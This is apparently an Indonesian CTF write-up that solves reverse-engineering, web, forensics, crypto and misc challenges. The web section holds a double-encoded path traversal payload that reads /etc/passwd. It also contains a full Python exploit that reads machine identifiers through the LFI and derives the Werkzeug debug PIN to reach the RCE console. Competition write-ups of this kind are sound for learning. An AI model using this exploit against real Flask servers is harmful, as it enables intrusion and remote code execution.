# Reverse Engineering
---
## Help Jimmy
diberikan attachment yang bisa kita run, attachment berupa binary striped ELF 64-bit LSB pie executable.Di dalam binary terdapat fungsi dimana fungsi ini akan mengeprint flagnya.

![](Pasted%20image%2020230122064030.png)

Untuk mendapatkan flagnya kita perlu jump ke fungsi ini. 

## krack me 1
Kita diberikan binary executable ELF. Saat melakukan dynamic analysis kita menemukan string yang terlihat random di dalam main function. Ini kita duga merupakan flagnya.

![](Pasted%20image%2020230122064820.png)

Setelah itu dibawah string tersebut ada for loop yang digunakan untuk mengecek flagnya.

```c
for ( ii = 0; ii < strlen((const char *)v13); ++ii )
  {
    if ( *((_BYTE *)v13 + ii) != ((unsigned __int8)(v20[14] ^ v16[8]) ^ (unsigned __int8)s[ii]) )
    {
      v12 = 0;
      break;
    }
    if ( *((_BYTE *)&v14[5] + ii) != ((unsigned __int8)(v17[11] ^ v17[1]) ^ (unsigned __int8)s[ii + 27]) )
    {
      v12 = 0;
      break;
    }
    if ( *((_BYTE *)&v13[5] + ii) != ((unsigned __int8)(v17[1] ^ HIBYTE(v13[0])) ^ (unsigned __int8)s[ii + 9]) )
    {
      v12 = 0;
      break;
    }
    if ( *((_BYTE *)v14 + ii) != ((unsigned __int8)(HIBYTE(v14[5]) ^ HIBYTE(v13[0])) ^ (unsigned __int8)s[ii + 18]) )
    {
      v12 = 0;
      break;
    }
    v12 = 1;
  }
```

Dari sini kita mencoba untuk mendecrypt string tersebut menggunakan logic xor yang ada di forloop tersebut. Berikut script yang saya gunakan untuk mendecode string tersebut.

```python
v17 = b"You don't have access to KrackMe 1.0 !"
v18 = b"Since you are here let me ask you something..."
v15 = b"Please enter the flag : "
v16 = b"Oh My God ! What is that ?"
v20 = b"Did you know, Bangladesh has the longest natural beach?..."

v13 = b"mer`]MtGe"
v135 = b"aUG9UeDoU"
v14 = b"(G~Ty_G{("
v145 = b"v}QlOto|s"

for i in range(len(v13)):
    print(chr((v20[14]^v16[8])^v13[i]), end="")

for i in range(len(v135)):
    print(chr((v17[1] ^ v13[1])^v135[i]), end="")

for i in range(len(v14)):
    print(chr((v145[1] ^ v13[1])^v14[i]), end="")

for i in range(len(v145)):
    print(chr((v17[11] ^ v17[1])^v145[i]), end="")
```

Kita jalankan dan kita akan mendapatkan flagnya

![](Pasted%20image%2020230122064919.png)



# Web Exploitation
---
## knight search

kita diberikan link website http://167.99.8.90:7777/ dimana vulnerable dengan lfi. Ini bisa kita ketahui saat menginputkan inputan yang ter-urlencoded 2x maka akan terbaca sebagai "../../../../../../../../../../../../../etc/passwd" di server mengembalikan  /etc/passwd sebagai output

```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

![](Pasted%20image%2020230122064152.png)

Karna web ini menggunakan framework flask, kita juga mengecek route "/console" yang bisa gunakan untuk mendapatkan RCE.

Nah karna kita sudah ketahui website ini ada vulnerability RCE dan flask Debug mode. Kita bisa menggenerate flask pin, sebagai referensi saya cantumkan link berikut:  
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

Berikut script yang saya gunakan untuk mendapatkan pin:

```python
import requests
from requests import Response
import re
import hashlib
from itertools import chain
import binascii

URL = "http://167.99.8.90:7777"

def gen_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    # cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv


def get_file(file, url=URL):
    class Res(Response):
        is_found: bool
        ptext: str
    res: Res = requests.post(url+"/home", data={
        "filename": q_parse(q_parse("../../../../../../../../../../../../.."+file)),
    })
    if "Try Harder....." in res.text:
        res.is_found = False
    else:
        res.is_found = True
        res.ptext = re.findall(
            r'(?<=b\').*?(?=\' \n.*?</div>)', res.text, re.DOTALL
        )[0]
        res.ptext = eval(f"'{res.ptext}'").strip()
    return res


def q_parse(x: str):
    file = x.encode()
    file = binascii.hexlify(file).decode()
    result = ""
    for i in range(0, len(file), 2):
        result += f"%{file[i]+file[i+1]}"
    return result


def get_username():
    text = get_file("/proc/self/environ").text
    username = re.search(r"(?<=HOME=/home/).*?(?=\\x00)",
                         text, re.DOTALL).group(0)
    return username
 
def get_flask_dir():
    templ_flask = "/usr/local/lib/python3.%s/%s/flask/app.py"
    for version in [i for i in range(7, 10)]:
        for location in ['site-packages', 'dist-packages']:
            flask = templ_flask % (version, location)
            file = get_file(flask)
            if file.is_found:
                return flask
    print("something wrong")
    exit(1)


def get_mac(device="eth0"):
    mac = get_file(f"/sys/class/net/{device}/address").ptext
    mac = mac.replace(":", "")
    mac = eval(f"0x{mac}")
    return str(mac)


def get_machine_id():
    linux = ""
    machine_id = get_file("/etc/machine-id")
    if not machine_id.is_found:
        boot_id = get_file("/proc/sys/kernel/random/boot_id")
        linux += boot_id.ptext
    else:
        linux += machine_id.ptext
    cgroup = get_file("/proc/self/cgroup")
    try:
        linux += cgroup.text.strip().rpartition(b"/")[2]
    except:
        pass
    return linux.strip()


if __name__ == "__main__":
    username = get_username()
    print("username     :", username)
    flask_dir = get_flask_dir()
    print("flask_dir    :", flask_dir)
    mac = get_mac()
    print("mac          :", mac)
    machine_id = get_machine_id()
    print("machine_id   :", machine_id)

    pin = gen_pin(probably_public_bits=[
        username,  # username
        'flask.app',  # modname
        'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__'))
        flask_dir,  # getattr(mod, '__file__', None),
    ], private_bits=[
        mac,  # str(uuid.getnode()),  /sys/class/net/ens33/address
        machine_id,  # get_machine_id(), /etc/machine-id
    ])
    print("pin          :", pin)
```

![](Pasted%20image%2020230122064305.png)

Setelah kita mendapatkan pin-nya kita tinggal akses /console menggunakan pin tersebut. Setelah itu kita baca file yang berisi flag yang ada di current directory

![](Pasted%20image%2020230122064318.png)

# forensic
---
## Go Deep! 
Pada challenge ini kita diberikan file sea.jpg. Kemudian kita menggunakan aplikasi binwalk pada file tersebut.

```
binwalk -eM sea.jpg --dd=".*"
```

maka akan menghasilkan folder `_sea.jpg.extracted/` yang didalamnya berisi file deep. Setelah di cek di file "deep" tersebut, ternyata headernya rusak. yang seharusnya png menjadi header jpeg. Ini bisa kita perhatikan menggunakan aplikasi bless. 

![](Pasted%20image%2020230122064420.png)

Yang dikanan merupakan file deep, sedangkan yang dikiri merupakan file png normal. Kita bisa melihat bahwa file deep memiliki "IHDR" pada bytesnya yang menandakan sebenarnya itu file png. Kita perlu merubah header dari file deep menjadi PNG, contohnya seperti berikut 

![](Pasted%20image%2020230122064435.png)

Setelah kita safe maka file deep aka bisa dilihat menggunakan image viewer.

![](Pasted%20image%2020230122064452.png)

Disini kita stuck, tapi thx to informasi dari tim. 

![](Pasted%20image%2020230122064534.png)

Sekarang kita coba untuk mengedit dimensinya. tapi karna pasti akan error CRC ketika kita mengedit dimensi saja, disini kita harus mengedit crcnya juga agar menyesuaikan dengan dimensinya. Disini saya mengambil referensi dari challenge  jade-ctf 2022 untuk mengedit dimensi dan menggenerate crcnya: https://github.com/TCP1P/TCP1P_CTF_writeup/blob/main/2022/jade-ctf/README.md#autocad 

Berikut script yang kita gunakan untuk merubah dimensi dan menggenerate crc:

```python
from binascii import crc32

with open("./_sea.jpg.extracted/deep", "rb") as f:
    img = f.read()

ihdr_ofset = img.find(b'IHDR')

w = 599
h = 600
crc = b"\x49\x48\x44\x52" + w.to_bytes(4, "big") + h.to_bytes(4, "big") + b"\x08\x06\x00\x00\x00"
crc = crc32(crc)

with open("./b.png", "wb") as f:
    nimg = (crc.to_bytes(4, "big")).join([img[:29], img[29+4:]])
    nimg = (w.to_bytes(4,"big")).join([nimg[:ihdr_ofset+4], nimg[ihdr_ofset+4+4:]])
    nimg = (h.to_bytes(4,"big")).join([nimg[:ihdr_ofset+8], nimg[ihdr_ofset+8+4:]])
    f.write(nimg)
```

Setelah kita jalankan maka kita akan mendapatkan gambar png yang berisi flagnya

![](Pasted%20image%2020230122064618.png)

# Crypto
---
## toddler RSA
pada soal ini kita hanya diberikan ciphertext dan kumpulan bilangan prima yang mana kumpulan bilangan prima tersebut terdapat faktor dari modulus N. Kita dapat melakukan dekripsi dengan menggunakan salah satu faktor prima dari modulus N, dengan syarat 

```
m < salah satu faktor prima modulus N
```

jika

```
m > salah satu faktor prima modulus N
```

maka hasilnya adalah

```
m % salah satu faktor prima modulus N
```

. Di sini saya berasumsi

```
m < salah satu faktor prima modulus N
```

, berikut solvernya:

```python
from Crypto.Util.number import long_to_bytes as l2b

f = open('infos.txt', 'r').read()
f = f.split('\n')

ct1 = int(f[0])
ct2 = int(f[1])

e = 0x10001

primes1 = [int(p) for p in f[2].split(' ')[:-1]]
primes2 = [int(p) for p in f[3].split(' ')[:-1]]

d1 = [pow(0x10001, -1, p-1) for p in primes1]
d2 = [pow(0x10001, -1, p-1) for p in primes2]

for i in range(len(primes1)):
    res = l2b(pow(ct1,d1[i],primes1[i]))
    if b'KCTF' in res:
        print(res)

for i in range(len(primes2)):
    print(l2b(pow(ct2,d2[i],primes2[i])))
```

flag: KCTF{rsa_and_only_rsa_ftw}

## Encode Mania
Aslinya gampang sih tinggal ngedecode aja wkwk. Awalnya ini program nge encode sebuah string sebanyak 12 kali dan setiap mau ngencode itu diacak entah pakai base64 / base32 / base16 / base85. Nah buat ngedecodenya tinggal dibalik aja kayak code dibawah, nyoba semua kemungkinan yang ada.

```python
import base64
import re

encoded_flag = "GUZDGMRUIQ3T......"
def decrypt(s, option):
    if option == 0:
        ret = base64.b64decode(s)
    elif option == 1:
        ret = base64.b32decode(s)
    elif option == 2:
        ret = base64.b16decode(s)
    else:
        ret = base64.b85decode(s)
    return ret

for _ in range(12):
    for option in range(4):
        try:
            dec = decrypt(encoded_flag, option)
            if re.findall(r"^\w+", dec.decode()):
                print(dec.decode())
            encoded_flag = dec.decode()
        except:
            pass
```

Nah nanti flagnya kayak gitu, buat lebih lengkapnya sepertinya mau ku upload ke repositoriku yang https://github.com/daffainfo/ctf-writeup tapi masih ngepush htb sekarang jadi sepertinya akan menyusul

# misc
---
## logger
Kita deberikan file berupa log seperti berikut.
![](Pasted%20image%2020230122064721.png)

Disini lognya diacak sehingga kita harus mengurutkannya untuk mendapatkan flag di route GET request yang ada pada log. Berikut script yang saya gunakan untuk mendapatkan flagnya.

```python
import re

with open("./misc-access.log", "r") as f:
    logs = f.readlines()

def get_time(x):
    return re.findall(r"\d{2}:\d{2}:\d{2}.\d{6}", x)

def get_msg(x):
    return re.findall(r"(?<=GET /).", x)

container = []
for log in logs:
    tmp0 = get_time(log)
    tmp1 = get_msg(log)
    container.append([tmp0, tmp1])

container = sorted(container)

for i in container:
    print(i[1][0], end="")
```

![](Pasted%20image%2020230122064755.png)

